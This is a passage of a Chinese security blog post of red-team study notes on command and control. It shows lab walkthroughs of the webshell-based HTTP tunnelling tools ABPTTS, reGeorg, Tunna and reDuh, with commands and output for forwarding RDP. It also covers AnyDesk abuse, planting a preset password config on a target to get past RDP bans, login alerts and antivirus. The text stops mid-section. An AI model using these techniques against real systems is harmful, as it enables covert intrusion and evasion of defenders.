<!DOCTYPE html><html lang="zh-CN" data-default-color-scheme="&#34;auto&#34;"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png"><link rel="icon" type="image/png" href="/img/favicon.png"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="theme-color" content="#2f4154"><meta name="description" content="没有天生的大牛，更没有永远的菜鸟求知若饥 , 虚心若愚"><meta name="author" content="iceH"><meta name="keywords" content=""><title>红队攻防学习之命令与控制 - iceH’s Blog</title><link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css"><link rel="stylesheet" href="/lib/hint/hint.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/css/gundongtiao.css#%20%E6%BB%9A%E5%8A%A8%E6%9D%A1%E9%A2%9C%E8%89%B2.css"><link rel="stylesheet" href="/css/shubiao.css#%20%E9%BC%A0%E6%A0%87%E6%8C%87%E9%92%88.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><link rel="stylesheet" href="/css/valine.css"><script id="fluid-configs">var Fluid=window.Fluid||{},CONFIG={hostname:"www.secice.cn",root:"/",version:"1.8.5",typing:{enable:!0,typeSpeed:70,cursorChar:"_",loop:!1},toc:{enable:!0,headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"right",visible:"hover",icon:""},copy_btn:!0,image_zoom:{enable:!0},lazyload:{enable:!0,onlypost:!1},web_analytics:{enable:!1,baidu:null,google:null,gtag:null,tencent:{sid:null,cid:null},woyaola:null,cnzz:null,leancloud:{app_id:null,app_key:null,server_url:null}}}</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="iceH’s Blog" type="application/atom+xml">
</head><body><header style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/">&nbsp;<strong>iceH's Blog</strong>&nbsp;</a> <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/"><i class="iconfont icon-home-fill"></i> 首页</a></li><li class="nav-item dropdown"><a class="nav-link dropdown-toggle" href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><i class="iconfont icon-books"></i> 博文</a><div class="dropdown-menu" aria-labelledby="navbarDropdown"><a class="dropdown-item" href="/archives/"><i class="iconfont icon-archive-fill"></i> 归档 </a><a class="dropdown-item" href="/categories/"><i class="iconfont icon-category-fill"></i> 分类 </a><a class="dropdown-item" href="/tags/"><i class="iconfont icon-tags-fill"></i> 标签</a></div></li><li class="nav-item"><a class="nav-link" href="/playlist/"><i class="iconfont icon-music"></i> 音乐</a></li><li class="nav-item"><a class="nav-link" href="/about/"><i class="iconfont icon-user-fill"></i> 关于</a></li><li class="nav-item"><a class="nav-link" href="/links/"><i class="iconfont icon-link-fill"></i> 友链</a></li><li class="nav-item" id="search-btn"><a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a></li></ul></div></div></nav><div class="banner intro-2" id="background" parallax="true" style="background:url(/img/background1.jpg) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="page-header text-center fade-in-up"><span class="h2" id="subtitle" title="红队攻防学习之命令与控制"></span><div class="mt-3"><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2020-12-21 14:19" pubdate>2020年12月21日 下午</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 3.2k 字 </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 46 分钟</span></div></div></div></div></div></header><main><div class="container-fluid"><div class="row"><div class="d-none d-lg-block col-lg-2"></div><div class="col-lg-8 nopadding-md"><div class="container nopadding-md" id="board-ctn"><div class="py-5" id="board"><article class="post-content mx-auto"><h1 style="display:none">红队攻防学习之命令与控制</h1><div class="markdown-body"><h1 id="三、命令与控制"><a href="#三、命令与控制" class="headerlink" title="三、命令与控制"></a>三、命令与控制</h1><h2 id="1、HTTP-隧道-ABPTTS"><a href="#1、HTTP-隧道-ABPTTS" class="headerlink" title="1、HTTP 隧道 ABPTTS"></a>1、HTTP 隧道 ABPTTS</h2><p><strong>ABPTTS简介：</strong></p><p>ABPTTS是NCC Group在2016年blackhat推出的一款将TCP流量通过HTTP/HTTPS进行流量转发，在目前云主机的大环境中，发挥了比较重要的作用，可以通过脚本进行RDP,SSH,Meterpreter的交互与连接。也意味着这样可以建立一个通过80端口得流量出站来逃避防火墙。与其它http隧道不同的是，abptts是全加密。</p><p><strong>2016年blackhat介绍：</strong></p><ul><li><a target="_blank" rel="noopener" href="https://www.blackhat.com/us-16/arsenal.html#a-black-path-toward-the-sun">https://www.blackhat.com/us-16/arsenal.html#a-black-path-toward-the-sun</a></li></ul><p><strong>Github：</strong></p><ul><li><a target="_blank" rel="noopener" href="https://github.com/nccgroup/ABPTTS">https://github.com/nccgroup/ABPTTS</a></li></ul><p><strong>安装与生成payload：</strong></p><pre><code class="hljs bash">root@John:~<span class="hljs-comment"># git clone https://github.com/nccgroup/ABPTTS.git</span>
Cloning into <span class="hljs-string">&#x27;ABPTTS&#x27;</span>...
remote: Enumerating objects: 50, <span class="hljs-keyword">done</span>.
remote: Total 50 (delta 0), reused 0 (delta 0), pack‐reused 50
Unpacking objects: 100% (50/50), <span class="hljs-keyword">done</span>.
root@John:~<span class="hljs-comment"># pip install pycrypto</span>
Requirement already satisfied: pycrypto <span class="hljs-keyword">in</span> /usr/lib/python2.7/dist‐packages (2.6.1)
root@John:~<span class="hljs-comment"># cd ABPTTS/</span>
root@John:~/ABPTTS<span class="hljs-comment"># ls</span>
abpttsclient.py abpttsfactory.py ABPTTS‐Manual.pdf data libabptts.py license.txt README.md settings_overlays template
root@John:~/ABPTTS<span class="hljs-comment"># python abpttsfactory.py ‐o webshell</span>
[2019‐01‐28 08:24:28.131919] ‐‐‐===[[[ A Black Path Toward The Sun ]]]===‐‐‐
[2019‐01‐28 08:24:28.131954] ‐‐==[[ ‐ Factory ‐ ]]==‐‐
[2019‐01‐28 08:24:28.131965] Ben Lincoln, NCC Group
[2019‐01‐28 08:24:28.131979] Version 1.0 ‐ 2016‐07‐30
[2019‐01‐28 08:24:28.132706] Output files will be created <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;/root/ABPTTS/webshell&quot;</span>
[2019‐01‐28 08:24:28.132722] Client‐side configuration file will be written as <span class="hljs-string">&quot;/root/ABPTTS/webshell/config.txt&quot;</span>
[2019‐01‐28 08:24:28.132739] Using <span class="hljs-string">&quot;/root/ABPTTS/data/american‐english ‐lowercase‐4‐64.txt&quot;</span> as a wordlist file
[2019‐01‐28 08:24:28.136713] Created client configuration file <span class="hljs-string">&quot;/root/ABPTTS/webshell/config.txt&quot;</span>
[2019‐01‐28 08:24:28.137760] Created server file <span class="hljs-string">&quot;/root/ABPTTS/webshell/abptts.jsp&quot;</span>
[2019‐01‐28 08:24:28.138342] Created server file <span class="hljs-string">&quot;/root/ABPTTS/webshell/abptts.aspx&quot;</span>
[2019‐01‐28 08:24:28.138492] Created server file <span class="hljs-string">&quot;/root/ABPTTS/webshell/war/WEB‐INF/web.xml&quot;</span>
[2019‐01‐28 08:24:28.138555] Created server file <span class="hljs-string">&quot;/root/ABPTTS/webshell/war/META‐INF/MANIFEST.MF&quot;</span>
[2019‐01‐28 08:24:28.139128] Prebuilt JSP WAR file: /root/ABPTTS/webshell/scabGroup.war
[2019‐01‐28 08:24:28.139140] Unpacked WAR file contents:/root/ABPTTS/webshell/war</code></pre><p>安装<code>pycrypto</code>出现问题参考：</p><ul><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/l1028386804/article/details/87006754">https://blog.csdn.net/l1028386804/article/details/87006754</a></li></ul><p><strong>靶机执行：</strong></p><p>以aspx为demo</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/01.png" srcset="/img/loading.gif" alt="demo"><br><strong>攻击机执行：</strong></p><p>注：如果攻击机为vps，则 -f 需要填写vps_ip:port/目标机:port</p><pre><code class="hljs css"><span class="hljs-selector-tag">python</span> <span class="hljs-selector-tag">abpttsclient</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">-c</span> <span class="hljs-selector-tag">webshell</span>/<span class="hljs-selector-tag">config</span><span class="hljs-selector-class">.txt</span> <span class="hljs-selector-tag">-u</span> &quot;<span class="hljs-selector-tag">http</span>://192.168.126.170<span class="hljs-selector-pseudo">:8031</span>/<span class="hljs-selector-tag">abptts</span><span class="hljs-selector-class">.aspx</span>&quot; <span class="hljs-selector-tag">-f</span> 192.168.1.101<span class="hljs-selector-pseudo">:33389</span>/192.168.126.170<span class="hljs-selector-pseudo">:3389</span></code></pre><p>然后连接<code>192.168.1.101:33389</code>即可，挺卡的。<br><img src="/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/02.png" srcset="/img/loading.gif" alt="连接3389"></p><p><code>提示目前不支持PHP</code></p><ul><li><a target="_blank" rel="noopener" href="https://micro8.gitbook.io/micro8/contents-1/91-100/96http-sui-dao-abptts-di-yi-ji">https://micro8.gitbook.io/micro8/contents-1/91-100/96http-sui-dao-abptts-di-yi-ji</a></li></ul><hr><h2 id="2、HTTP-隧道-reGeorg"><a href="#2、HTTP-隧道-reGeorg" class="headerlink" title="2、HTTP 隧道 reGeorg"></a>2、HTTP 隧道 reGeorg</h2><p>reGeorg 的前身是2008年 SensePost 在 BlackHat USA 2008 的 reDuh 延伸与扩展。也是目前安全从业人员使用最多，范围最广，支持多丰富的一款 http 隧道。从本质上讲，可以将 JSP/PHP/ASP/ASPX 等页面上传到目标服务器，便可以访问该服务器后面的主机。</p><p><strong>2014年blackhat介绍</strong></p><ul><li><a target="_blank" rel="noopener" href="https://www.blackhat.com/eu-14/arsenal.html#regeorg">https://www.blackhat.com/eu-14/arsenal.html#regeorg</a></li></ul><p><strong>Github：</strong></p><ul><li><a target="_blank" rel="noopener" href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></li></ul><p><strong>环境</strong></p><pre><code class="hljs accesslog">靶机：
<span class="hljs-number">192.168.126.170</span> 外网IP
<span class="hljs-number">192.168.2.102</span> 内网IP</code></pre><p><strong>安装</strong></p><pre><code class="hljs bash">root@John:~<span class="hljs-comment"># git clone https://github.com/sensepost/reGeorg.git</span>
Cloning into <span class="hljs-string">&#x27;reGeorg&#x27;</span>...
remote: Enumerating objects: 85, <span class="hljs-keyword">done</span>.
remote: Total 85 (delta 0), reused 0 (delta 0), pack‐reused 85
Unpacking objects: 100% (85/85), <span class="hljs-keyword">done</span>.
root@John:~<span class="hljs-comment"># cd reGeorg/</span>
root@John:~reGeorg<span class="hljs-comment"># ls</span>
LICENSE.html LICENSE.txt README.md reGeorgSocksProxy.py tunnel.ashx tu
nnel.aspx tunnel.js tunnel.jsp tunnel.nosocket.php tunnel.php tunnel.tomcat.5.jsp
root@John:~/reGeorg<span class="hljs-comment"># python reGeorgSocksProxy.py ‐h</span>


_____
_____ ______ __|___ |__ ______ _____ _____ ______
| | | ___|| ___| || ___|/ \| | | ___|
| \ | ___|| | | || ___|| || \ | | |
|__|\__\|______||______| __||______|\_____/|__|\__\|______|
|_____|
... every office needs a tool like Georg 

willem@sensepost.com / @_w_m__
sam@sensepost.com / @trowalts
etienne@sensepost.com / @kamp_staaldraad 

usage: reGeorgSocksProxy.py [‐h] [‐l] [‐p] [‐r] ‐u [‐v] 

Socks server <span class="hljs-keyword">for</span> reGeorg HTTP(s) tunneller 

optional arguments:
‐h, ‐‐<span class="hljs-built_in">help</span> show this <span class="hljs-built_in">help</span> message and <span class="hljs-built_in">exit</span>
‐l , ‐‐listen‐on The default listening address
‐p , ‐‐listen‐port The default listening port
‐r , ‐‐<span class="hljs-built_in">read</span>‐buff Local <span class="hljs-built_in">read</span> buffer, max data to be sent per POST
‐u , ‐‐url The url containing the tunnel script
‐v , ‐‐verbose Verbose output[INFO\|DEBUG]</code></pre><p><strong>靶机执行：</strong></p><p>以aspx为demo</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/03.png" srcset="/img/loading.gif" alt="demo"></p><p><strong>攻击机执行：</strong></p><pre><code class="hljs css"><span class="hljs-selector-tag">python</span> <span class="hljs-selector-tag">reGeorgSocksProxy</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">-p</span> 8080 <span class="hljs-selector-tag">-u</span> <span class="hljs-selector-tag">http</span>://192.168.126.170<span class="hljs-selector-pseudo">:8031</span>/<span class="hljs-selector-tag">tunnel</span><span class="hljs-selector-class">.aspx</span></code></pre><p><img src="/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/04.png" srcset="/img/loading.gif" alt="运行"><br><strong>Windows下配合Proxifier：</strong></p><p><img src="/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/05.png" srcset="/img/loading.gif" alt="Proxifier"><br><img src="/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/06.png" srcset="/img/loading.gif" alt="使用内网IP连接服务器"><br>目前大部分waf都会针对默认原装版本的reGeorg</p><ul><li><a target="_blank" rel="noopener" href="https://micro8.gitbook.io/micro8/contents-1/91-100/98http-sui-dao-regeorg-di-er-ji">https://micro8.gitbook.io/micro8/contents-1/91-100/98http-sui-dao-regeorg-di-er-ji</a></li></ul><hr><h2 id="3、HTTP-隧道-Tunna"><a href="#3、HTTP-隧道-Tunna" class="headerlink" title="3、HTTP 隧道 Tunna"></a>3、HTTP 隧道 Tunna</h2><p><strong>Tunna简介：</strong></p><p>Tunna1.1 是 secforce 在2014年11月出品的一款基于HTTP隧道工具。其中v1.1中支持了SOCKS4a。</p><p><strong>Tunna演示稿：</strong></p><ul><li><a target="_blank" rel="noopener" href="https://drive.google.com/open?id=1PpB8_ks93isCaQMEUFf_cNvbDsBcsWzE">https://drive.google.com/open?id=1PpB8_ks93isCaQMEUFf_cNvbDsBcsWzE</a></li></ul><p><strong>Github：</strong></p><ul><li><a target="_blank" rel="noopener" href="https://github.com/SECFORCE/Tunna">https://github.com/SECFORCE/Tunna</a></li></ul><p><strong>环境：</strong></p><pre><code class="hljs accesslog">攻击机
<span class="hljs-number">192.168.1.101</span>

靶机
<span class="hljs-number">192.168.126.170</span> 外网IP
<span class="hljs-number">192.168.2.102</span> 内网IP</code></pre><p><strong>安装：</strong></p><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@John:~# git clone https://github.com/SECFORCE/Tunna.git
<span class="hljs-attribute">Cloning</span> into &#x27;Tunna&#x27;...
<span class="hljs-attribute">remote</span>: Enumerating objects: <span class="hljs-number">6</span>, done.
<span class="hljs-attribute">remote</span>: Counting objects: <span class="hljs-number">100</span>% (<span class="hljs-number">6</span>/<span class="hljs-number">6</span>), done.
<span class="hljs-attribute">remote</span>: Compressing objects: <span class="hljs-number">100</span>% (<span class="hljs-number">6</span>/<span class="hljs-number">6</span>), done.
<span class="hljs-attribute">remote</span>: Total <span class="hljs-number">156</span> (delta <span class="hljs-number">0</span>), reused <span class="hljs-number">2</span> (delta <span class="hljs-number">0</span>), pack‐reused <span class="hljs-number">150</span>
<span class="hljs-attribute">Receiving</span> objects: <span class="hljs-number">100</span>% (<span class="hljs-number">156</span>/<span class="hljs-number">156</span>), <span class="hljs-number">8</span>.<span class="hljs-number">93</span> MiB | <span class="hljs-number">25</span>.<span class="hljs-number">00</span> KiB/s, done.
<span class="hljs-attribute">Resolving</span> deltas: <span class="hljs-number">100</span>% (<span class="hljs-number">84</span>/<span class="hljs-number">84</span>), done.</code></pre><p><strong>靶机执行：</strong></p><p>以aspx为demo</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/07.png" srcset="/img/loading.gif" alt="demo"><br><strong>攻击机执行：</strong></p><pre><code class="hljs apache"><span class="hljs-attribute">py</span> -<span class="hljs-number">2</span> proxy.py -u http://<span class="hljs-number">192.168.126.170:8031</span>/conn.aspx -l <span class="hljs-number">1234</span> -r <span class="hljs-number">3389</span> -s -v</code></pre><p><img src="/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/08.png" srcset="/img/loading.gif" alt="执行"><br><img src="/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/09.png" srcset="/img/loading.gif" alt="连接"><br><strong>附录：</strong><br>解决：<code>General Exception: [Errno 104] Connection reset by peer</code></p><pre><code class="hljs angelscript"><span class="hljs-string">[+]</span> Spawning keep‐alive thread
<span class="hljs-string">[‐]</span> Keep‐alive thread <span class="hljs-keyword">not</span> required
<span class="hljs-string">[+]</span> Checking <span class="hljs-keyword">for</span> proxy: False</code></pre><p>连接后，出现</p><pre><code class="hljs pgsql">General <span class="hljs-keyword">Exception</span>: [Errno <span class="hljs-number">104</span>] <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">reset</span> <span class="hljs-keyword">by</span> peer</code></pre><p>等待出现：无法验证此远程计算机的身份，是否仍要连接？</p><p>再次运行，在点击是(Y)</p><pre><code class="hljs apache"><span class="hljs-attribute">py</span> -<span class="hljs-number">2</span> proxy.py -u http://<span class="hljs-number">192.168.126.170:8031</span>/conn.aspx -l <span class="hljs-number">1234</span> -r <span class="hljs-number">3389</span> -s -v</code></pre><p><img src="/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/10.png" srcset="/img/loading.gif" alt="解决报错"></p><p>如果：没有出现“无法验证此远程计算机的身份，是否仍要连接？”</p><p>注册表键值：<code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers</code> 删除对应IP键值即可。</p><p>Tunna对PHP的支持并不是太友好</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://micro<span class="hljs-number">8</span>.gitbook.io/micro<span class="hljs-number">8</span>/contents-<span class="hljs-number">1</span>/<span class="hljs-number">91</span>-<span class="hljs-number">100</span>/<span class="hljs-number">99</span>http-sui-dao-tunna-di-san-ji</code></pre><hr><h2 id="4、HTTP-隧道-reDun"><a href="#4、HTTP-隧道-reDun" class="headerlink" title="4、HTTP 隧道 reDun"></a>4、HTTP 隧道 reDun</h2><p><strong>reDuh简介：</strong></p><p>reDuh是sensepost由2008-07年发布，从本质上讲，可以将JSP/PHP/ASP/ASPX等页面上传到目标服务器，便可以访问该服务器后面的主机。</p><p><strong>BlackHat USA 2008介绍：</strong></p><ul><li><a target="_blank" rel="noopener" href="https://drive.google.com/open?id=1AqmtuBnHQJS-FjVHzJMNNWokda048By-">https://drive.google.com/open?id=1AqmtuBnHQJS-FjVHzJMNNWokda048By-</a></li></ul><p><strong>reDuh使用条件</strong></p><p>（1）获取目标服务器webshell，且可以上传reDuh服务端对应脚本文件。</p><p>（2）知道目标服务器开放的内网端口，如远程桌面的端口是3389。</p><p>（3）目标服务器网络做了端口策略限制，只允许外部访问内网的80等特定端口。</p><p><strong>Github：</strong></p><ul><li><a target="_blank" rel="noopener" href="https://github.com/sensepost/reDuh">https://github.com/sensepost/reDuh</a></li></ul><p><strong>环境：</strong></p><pre><code class="hljs accesslog">攻击机
<span class="hljs-number">192.168.1.101</span>

靶机
<span class="hljs-number">192.168.126.170</span> 外网IP
<span class="hljs-number">192.168.2.102</span> 内网IP</code></pre><p><strong>安装：</strong></p><pre><code class="hljs elixir">root<span class="hljs-variable">@John</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># git clone https://github.com/sensepost/reDuh.git</span>
Cloning into <span class="hljs-string">&#x27;reDuh&#x27;</span>...
<span class="hljs-symbol">remote:</span> Enumerating <span class="hljs-symbol">objects:</span> <span class="hljs-number">47</span>, done.
<span class="hljs-symbol">remote:</span> Total <span class="hljs-number">47</span> (delta 0), reused 0 (delta 0), pack‐reused <span class="hljs-number">47</span>
Unpacking <span class="hljs-symbol">objects:</span> <span class="hljs-number">100</span>% (<span class="hljs-number">47/47</span>), done.
root<span class="hljs-variable">@John</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># cd reDuh/</span>
root<span class="hljs-variable">@John</span><span class="hljs-symbol">:~/reDuh</span><span class="hljs-comment"># ls</span>
README.markdown reDuhClient reDuhServers</code></pre><p><strong>靶机执行：</strong></p><p>以aspx为demo</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/11.png" srcset="/img/loading.gif" alt="demo"><br><strong>攻击机执行：</strong></p><p>绑定端口：</p><pre><code class="hljs bash">$ java -jar reDuhClient.jar http://192.168.126.170:8031/reDuh.aspx host:3389
[Info]Using Proxy: host:3389
[Info]Querying remote web page <span class="hljs-keyword">for</span> usable remote service port
[Info]Remote RPC port chosen as 42000
[Info]Attempting to start reDuh from 192.168.126.170:8031/reDuh.aspx.  Using service port 42000. Please <span class="hljs-built_in">wait</span>...
[Info]*********************************************************
[Info]***                 Using proxy                       ***
[Info]*********************************************************
[Info]*** We<span class="hljs-string">&#x27;ll not know whether reDuh started successfully ***</span>
<span class="hljs-string">[Info]*** Starting ReDuh now and lets hope for the best...  ***</span>
<span class="hljs-string">[Info]*********************************************************</span>
<span class="hljs-string">[Info]reDuhClient service listener started on local port 1010</span></code></pre><p>开启新terminal，建立隧道</p><p><strong>命令如下：</strong></p><pre><code class="hljs css"><span class="hljs-selector-tag">telnet</span> 127.0.0.1 1010
然后执行
<span class="hljs-selector-attr">[createTunnel]</span>1234<span class="hljs-selector-pseudo">:127.0.0.1</span><span class="hljs-selector-pseudo">:3389</span></code></pre><p><img src="/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/13.png" srcset="/img/loading.gif" alt="执行"></p><p>访问本地1234端口，既等价于访问靶机3389端口</p><p><img src="/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/14.png" srcset="/img/loading.gif" alt="连接"><br>遗憾的是reDuh年代久远，使用繁琐，并官方已停止维护。但是它奠定了HTTP隧道</p><ul><li><a target="_blank" rel="noopener" href="https://micro8.gitbook.io/micro8/contents-1/91-100/100http-sui-dao-reduh-di-si-ji">https://micro8.gitbook.io/micro8/contents-1/91-100/100http-sui-dao-reduh-di-si-ji</a></li></ul><hr><h2 id="5、基于-Ptunnel-建立ICMP隧道（没复现）"><a href="#5、基于-Ptunnel-建立ICMP隧道（没复现）" class="headerlink" title="5、基于 Ptunnel 建立ICMP隧道（没复现）"></a>5、基于 Ptunnel 建立ICMP隧道（没复现）</h2><p><strong>前言</strong></p><p>在某些渗透测试环境下，获得了一个主机的权限但是该主机没有访问外网的权限，对于这种较为严格的网络环境，第一时间想到的就是隧道技术。常见的隧道技术有SSH\DNS\ICMP\端口转发等，大多数端口都存在被禁用的可能，但是ICMP作为基础服务被禁用的可能性却极小，在常用协议都被禁用的情况下可以考虑使用ICMP隧道。</p><p><strong>网络拓扑</strong></p><p><img src="/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201221_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/15.png" srcset="/img/loading.gif" alt="网络拓扑"><br>内网主机10.10.10.0/24除了ICMP通讯不能主动访问外网任何资源，20.20.20.101为hack的ICMP隧道服务端</p><p><strong>可以参考</strong></p><ul><li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1s54y1X7i4">https://www.bilibili.com/video/BV1s54y1X7i4</a></li></ul><hr><h2 id="6、使用anydesk做远控（没复现）"><a href="#6、使用anydesk做远控（没复现）" class="headerlink" title="6、使用anydesk做远控（没复现）"></a>6、使用anydesk做远控（没复现）</h2><p>anydesk是类似teamviewer的远程管理软件，但是他不用安装且体积小</p><p><strong>场景举例</strong></p><p>1）有云锁，护卫神等禁止3389登录时<br>2）类似阿里云这种，登录3389会报警<br>3）连接内网中可以出网的windows机器</p><p><strong>注意事项</strong></p><p>1）启动anydesk的权限需要桌面用户权限，比如，IIS做中间件的环境中，拿到了webshell一般都是没有桌面用户权限的，如果启动anydesk不会成功</p><p>2）启动anydesk时桌面不能被注销</p><p>3）有可能连接上去是黑屏，这个是因为该桌面用户退出远程桌面但没有注销，此时，除非能用<br>winlogon启动anydesk，否则没法使用屏幕</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.zhihuifly.com<span class="hljs-regexp">/t/</span>topic/<span class="hljs-number">1121</span>

https:<span class="hljs-regexp">//</span><span class="hljs-number">422926799</span>.github.io<span class="hljs-regexp">/posts/</span><span class="hljs-number">6</span>b1dcf8a.html</code></pre><p>这里是还有很骚气的方法，往后在亲自复现…</p><hr><p>复现另外的方法…</p><p><strong>AnyDesk利用</strong></p><p>AnyDesk 是一款声称速度最快的免费长途衔接/长途桌面操控软件，据说是前 TeamViewer 开发小组人员自立门户的商品，它拥有领先的视频压缩技能 DeskRT， 能够轻松穿透防火墙/路由器。 重点是不用安装，而且体积只有2,917KB。<br>镜外诈骗人员使用修改版本做为远控，发给受害人获取控制电脑权限。</p><p>本地anydesk设置自主访问密码，然后生成的配置文件放到目标中，这样只要获取ad.anynet.id即可连接。收费版支持命令行反回ad.anynet.id与设置密码。不需要像免费版这么复杂。</p><p><strong>使用场景</strong></p><pre><code class="hljs armasm">云锁，护卫神等禁止<span class="hljs-number">3389</span>登录绕过；
阿里云登录<span class="hljs-number">3389</span>则会<span class="hljs-built_in">IP</span>报警提示绕过；
内网穿透机器、传输文件等；
白名单软件过全世界所有杀软、流量加密；
<span class="hljs-symbol">BlackRouter</span>勒索软件通过AnyDesk捆绑进行传播；</code></pre><p><strong>支持操作系统</strong></p><pre><code class="hljs ebnf"><span class="hljs-attribute">Windows</span>
<span class="hljs-attribute">MacOS</span>
<span class="hljs-attribute">Android</span>
<span class="hljs-attribute">IOS</span>
<span class="hljs-attribute">Linux</span>
<span class="hljs-attribute">FreeBSD</span>
<span class="hljs-attribute">Raspberry Pi</span>
<span class="hljs-attribute">Chrome OS</span></code></pre><p><strong>利用条件</strong></p><pre><code class="hljs plain">桌面用户权
anydesk时桌面不能被注</code></pre><p><strong>首先本机生成密码:</strong><br><img src="https://img-blog.csdnimg.cn/20200927205157982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>配置文件将会保存在：<br><img src="https://img-blog.csdnimg.cn/2020092720521626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>service.conf存放</p><pre><code class="hljs css"><span class="hljs-selector-tag">ad</span><span class="hljs-selector-class">.anynet</span><span class="hljs-selector-class">.pwd_hash</span>与<span class="hljs-selector-tag">ad</span><span class="hljs-selector-class">.anynet</span><span class="hljs-selector-class">.pwd_salt</span>提取出来。</code></pre><p>system.conf存放：</p><pre><code class="hljs css"><span class="hljs-selector-tag">ad</span><span class="hljs-selector-class">.anynet</span><span 